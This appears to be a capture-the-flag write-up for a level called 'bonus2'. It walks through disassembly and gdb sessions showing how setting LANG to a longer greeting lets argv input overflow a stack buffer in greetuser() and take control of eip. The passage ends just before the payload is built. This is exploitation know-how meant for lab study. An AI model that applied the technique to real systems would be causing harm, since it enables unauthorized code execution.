## bonus2

The program in `bonus2` expects two arguments otherwise the program exit properly. <br> `0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3`<br>
The `main()` function reserves space for a *buffer[0x50]* `0x08048548 <+31>:	lea    ebx,[esp+0x50]` where `40 bytes` from the first argument __argv[1]__ will be copied and
another `32 bytes` from the second arguments __argv[2]__ will be also copied right after the first <br> `40 bytes` `0x08048594 <+107>:	add    eax,0x28`. <br>
Next a call to `getenv()` wiht the the parameter `"LANG"` is made and the the value return by `getenv()` is stored at `esp+0x9c` then two calls to `memcmp()` are
made against this value, the first will check if the string is equal to *fi* if they are equal a *global* variable stored at `0x8049988` will be set to `0x1` if 
the strings doesn't match the second call to `memcmp()` will be made this time with the string *nl* and if they are equal the *global* variable will be set `0x2`
if none of the cases are true the *global* variable as a default value of `0x0`. <br>
Next a call to the function `greetuser(buffer[0x50])` will be made.<br>
The function `greetuser()` also reserves spaces for a *greetbuffer[0x48]* and then the function will precede to check the value of the *global* variable
` 0x0804848a <+6>:	mov    eax,ds:0x8049988` against `0x2, 0x1, 0x0` depending on the result the function will `strncpy()` a *greeting* message to the *greetbuffer[0x48]* with the *LANG* that is set *(remember this, it will come in handy later)*.
Right after that the parameters we suplied to the program will be concatenated to the *greetbuffer[0x48]* `=> 0x0804850a <+134>:	lea    eax,[ebp+0x8]` <br>
*__Time to get dirty little boy!__* <br>
here smells some exploit, the `greetuser()` function is concatenating what we pass to the program as parameter to a *buffer[72]* without checking, what if we overwrite the main *eip* that is sleeping on the stack ? let's check if we can touch it :p <br>
We know that in `main()` two calls to `strncpy()` are made for copying `40 bytes` from the first argv and `32 bytes` from the second argv what gives us `72 bytes` plus the greeting that is copied into the *greetbuffer[72]* before the concatenation, it should be enough to write past the *greetbuffer[72]*, we will start with that.
```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()

(gdb) i r
eax            0x4f	79
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff630	-1073744336
esp            0xbffff5e0	0xbffff5e0
ebp            0x42424242	0x42424242
esi            0xbffff67c	-1073744260
edi            0xbffff62c	-1073744340
eip            0x8004242	0x8004242
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
As we can see the `eip` is being overwrote by only two bytes and the greeting being added to the begining is in english, lets check our `env` indeed
```
[...]
PWD=/home/user/bonus2
LANG=en_US.UTF-8
SHLVL=5
HOME=/home/user/bonus2
[...]
```
Let's check the other greeting lengh
```
0x080484ba <+54>:	mov    edx,0x8048717 (I used a little program with a printf as I could not see the string)
(gdb) x/s 0x8048717
0x8048717:	 "Hyv\303\244\303\244 p\303\244iv\303\244\303\244 "
⇒ ./a.out 
Hyvää päivää (13 bytes) there's a space at the end
0x080484e9 <+101>:	mov    edx,0x804872a
(gdb) x/s 0x804872a
0x804872a:	 "Goedemiddag! " (13 bytes) idem
```
lets try to change our `env` it doesn't matter which we choose both are `13 bytes` long
```
:~$ export LANG="fi"
~$ env
[...]
PWD=/home/user/bonus2
LANG=fi
SHLVL=5
HOME=/home/user/bonus2
LC_TERMINAL_VERSION=3.3.12
LOGNAME=bonus2
[...]
```
Now let's re run the program again
```
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
Great we have it, now let's prepare the payload
